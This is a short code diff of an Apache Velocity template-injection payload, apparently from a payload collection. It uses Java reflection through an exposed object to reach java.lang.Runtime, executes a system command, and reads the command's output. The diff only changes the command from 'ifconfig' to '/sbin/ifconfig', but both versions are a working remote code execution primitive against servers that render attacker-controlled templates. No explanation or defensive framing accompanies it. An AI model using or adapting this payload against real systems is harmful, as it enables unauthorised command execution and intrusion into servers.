@@ -1,4 +1,4 @@
-#set($ex=$i18n.getClass().forName('java.lang.Runtime').getMethod('getRuntime', null).invoke(null, null).exec('ifconfig'))
+#set($ex=$i18n.getClass().forName('java.lang.Runtime').getMethod('getRuntime', null).invoke(null, null).exec('/sbin/ifconfig'))
 $ex.waitFor()
 #set($out=$ex.getInputStream())
 #foreach($i in [1..$out.available()])
